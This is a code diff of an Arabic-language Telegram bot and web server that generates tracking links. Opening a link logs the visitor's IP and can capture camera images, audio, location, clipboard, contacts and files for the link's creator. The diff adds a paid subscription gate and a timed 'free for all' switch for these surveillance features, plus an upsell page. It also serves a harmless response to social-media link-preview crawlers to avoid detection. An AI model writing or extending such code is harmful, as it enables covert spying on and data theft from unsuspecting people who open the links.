@@ -21,18 +21,21 @@ const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
 let targets    = new Set(loadJSON(TARGETS_FILE, []));
 let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
-let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", features:{...DEFAULT_FEATURES}, featureExpiry:null, ...loadJSON(SETTINGS_FILE,{}) };
+let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", features:{...DEFAULT_FEATURES}, featureExpiry:null, premiumFree:{...DEFAULT_PREMIUM_FREE}, premiumFreeExpiry:{}, ...loadJSON(SETTINGS_FILE,{}) };
 let notes      = loadJSON(NOTES_FILE, {});
 let userStats  = loadJSON(USERSTATS_FILE, {});
 let profiles   = loadJSON(PROFILES_FILE, {});  // { "userId": { name, username, seen } }
 let premium    = loadJSON(PREMIUM_FILE,  {});  // { "userId": { expiry: ts|-1, plan: 'monthly'|'yearly'|'lifetime' } }
 
-if (!settings.features) settings.features = {...DEFAULT_FEATURES};
+if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
+if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
+if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
 
 function saveUsers()     { saveJSON(USERS_FILE,     [...users]); }
 function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]); }
@@ -52,6 +55,44 @@ function isPremium(uid) {
   if (!p) return false;
   if (p.expiry === -1) return true;          // lifetime
   return Date.now() < p.expiry;
+}
+
+// Returns true if the premium feature is currently unlocked for ALL users
+function isPremiumFeatureFree(feature) {
+  if (!settings.premiumFree?.[feature]) return false;
+  const exp = settings.premiumFreeExpiry?.[feature];
+  if (exp && Date.now() > exp) {
+    settings.premiumFree[feature] = false;
+    settings.premiumFreeExpiry[feature] = null;
+    saveSettings();
+    return false;
+  }
+  return true;
+}
+
+// Returns true if uid can use a specific premium feature
+function canUsePremium(uid, feature) {
+  return isPremium(uid) || isPremiumFeatureFree(feature);
+}
+
+// HTML upsell page for non-premium users
+function upsellPage(ownerUsername) {
+  const u = ownerUsername || 'Ye_x00';
+  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ميزة مدفوعة</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}.card{background:#12122a;border:1px solid #2a2a5a;border-radius:20px;padding:36px 28px;max-width:360px;width:92%;text-align:center;}.icon{font-size:54px;margin-bottom:14px}.title{font-size:21px;font-weight:700;color:#e0e0ff;margin-bottom:10px}.sub{font-size:13px;color:#888;margin-bottom:24px;line-height:1.7}.features{background:#0d0d22;border-radius:12px;padding:16px;margin-bottom:24px;text-align:right}.feat-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #1a1a3a;font-size:13px;color:#ccc}.feat-row:last-child{border-bottom:none}.btn{display:block;width:100%;background:linear-gradient(135deg,#0066ff,#0044aa);color:#fff;border:none;padding:15px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;}</style>
+</head><body><div class="card">
+<div class="icon">💎</div>
+<div class="title">ميزة حصرية للمشتركين</div>
+<div class="sub">هذه الميزة متاحة فقط للمشتركين في الباقة المدفوعة</div>
+<div class="features">
+  <div class="feat-row">📷 الكاميرا الأمامية والخلفية</div>
+  <div class="feat-row">🎤 تسجيل صوتي</div>
+  <div class="feat-row">📋 محتوى الحافظة</div>
+  <div class="feat-row">📒 جهات الاتصال الكاملة</div>
+  <div class="feat-row">🖼️ الصور والملفات</div>
+</div>
+<a class="btn" href="https://t.me/${u}">💬 تواصل للاشتراك</a>
+</div></body></html>`;
 }
 
 // Premium expiry watcher — alert owner when someone's premium expires
@@ -289,7 +330,10 @@ async function handleLinkOpen(req, res, view) {
 
   const feat = settings.features || DEFAULT_FEATURES;
   const userPremium = isPremium(creatorId);
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium });
+  const camAccess  = canUsePremium(creatorId, 'camera');
+  const audioAccess= canUsePremium(creatorId, 'audio');
+  const clipAccess = canUsePremium(creatorId, 'clipboard');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -305,7 +349,7 @@ app.get("/f/:path/*", async (req, res) => {
   if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
   if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
   const creatorId = parseInt(req.params.path, 36);
-  if (!isPremium(creatorId)) return res.send('<h2 style="font-family:sans-serif;text-align:center;margin-top:20%">⛔ هذه الميزة للمشتركين المدفوعين فقط</h2>');
+  if (!canUsePremium(creatorId, 'files')) return res.send(upsellPage());
   const ip = getIP(req);
   const d  = new Date().toJSON().slice(0,19).replace('T',':');
   stats.linksOpened++; saveStats();
@@ -328,7 +372,7 @@ app.get("/co/:path/*", async (req, res) => {
   if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
   if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
   const creatorId = parseInt(req.params.path, 36);
-  if (!isPremium(creatorId)) return res.send('<h2 style="font-family:sans-serif;text-align:center;margin-top:20%">⛔ هذه الميزة للمشتركين المدفوعين فقط</h2>');
+  if (!canUsePremium(creatorId, 'contacts')) return res.send(upsellPage());
   const ip = getIP(req);
   const d  = new Date().toJSON().slice(0,19).replace('T',':');
   stats.linksOpened++; saveStats();
@@ -668,6 +712,11 @@ bot.on('message', async (msg) => {
     return sendFeaturesMenu(chatId);
   }
 
+  if (msg.text === "/premiumconfig") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    return bot.sendMessage(chatId, premiumConfigText(), { parse_mode:"Markdown", reply_markup: buildPremiumConfigKeyboard() });
+  }
+
   // /lastopen — آخر فتح لكل مستخدم
   if (msg.text === "/lastopen") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
@@ -807,6 +856,38 @@ bot.on('callback_query', async (q) => {
     return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
 
   // ── Feature buttons ────────────────────────────────────────────────────────
+  // ── Premium Config buttons ──────────────────────────────────────────────────
+  if (data.startsWith("pc:") && chatId === BOT_OWNER) {
+    const msgId = q.message.message_id;
+    if (data.startsWith("pc:t:")) {
+      const k = data.replace("pc:t:","");
+      if (k in (settings.premiumFree || {})) {
+        settings.premiumFree[k] = !settings.premiumFree[k];
+        if (!settings.premiumFree[k]) settings.premiumFreeExpiry[k] = null;
+        saveSettings();
+      }
+    } else if (data.startsWith("pc:timer:")) {
+      const mins = parseInt(data.replace("pc:timer:",""));
+      const exp  = Date.now() + mins * 60 * 1000;
+      Object.keys(PREM_FEAT_NAMES).forEach(k => {
+        settings.premiumFree[k]        = true;
+        settings.premiumFreeExpiry[k]  = exp;
+      });
+      saveSettings();
+    } else if (data === "pc:allpaid") {
+      Object.keys(PREM_FEAT_NAMES).forEach(k => {
+        settings.premiumFree[k]       = false;
+        settings.premiumFreeExpiry[k] = null;
+      });
+      saveSettings();
+    }
+    return bot.editMessageText(premiumConfigText(), {
+      chat_id: chatId, message_id: msgId,
+      parse_mode: "Markdown",
+      reply_markup: buildPremiumConfigKeyboard()
+    }).catch(() => {});
+  }
+
   if (data.startsWith("ft:") && chatId === BOT_OWNER) {
     const msgId = q.message.message_id;
     if (data.startsWith("ft:t:")) {
@@ -849,6 +930,38 @@ const FEAT_NAMES = {
   lightSensor: "💡 مستشعر الضوء",
   clipboard:   "📋 الحافظة"
 };
+
+// ── Premium Config Menu ───────────────────────────────────────────────────────
+const PREM_FEAT_NAMES = {
+  camera:    "📷 الكاميرا",
+  audio:     "🎤 الصوت",
+  clipboard: "📋 الحافظة",
+  contacts:  "📒 جهات الاتصال",
+  files:     "🖼️ الصور/الملفات"
+};
+
+function premiumConfigText() {
+  const lines = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
+    const isFree = isPremiumFeatureFree(k);
+    const exp    = settings.premiumFreeExpiry?.[k];
+    const expStr = exp ? ` (حتى ${new Date(exp).toJSON().slice(11,16)} UTC)` : '';
+    return `${isFree ? '🟢 مجاني' : '🔴 مدفوع'} ${name}${expStr}`;
+  });
+  return `💎 *إعدادات الميزات المدفوعة*\n\nاضغط على الميزة لتبديلها بين مجاني ومدفوع:\n\n${lines.join('\n')}`;
+}
+
+function buildPremiumConfigKeyboard() {
+  const rows = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
+    const isFree = isPremiumFeatureFree(k);
+    return [{ text: `${isFree ? '🟢' : '🔴'} ${name}`, callback_data: `pc:t:${k}` }];
+  });
+  rows.push([
+    { text: "⏱️ 15د مجاني للكل",  callback_data: "pc:timer:15" },
+    { text: "⏱️ 60د مجاني للكل",  callback_data: "pc:timer:60" }
+  ]);
+  rows.push([{ text: "🔴 مدفوع للكل", callback_data: "pc:allpaid" }]);
+  return JSON.stringify({ inline_keyboard: rows });
+}
 
 function buildFeaturesKeyboard() {
   const rows = Object.entries(settings.features).map(([k, v]) => ([{
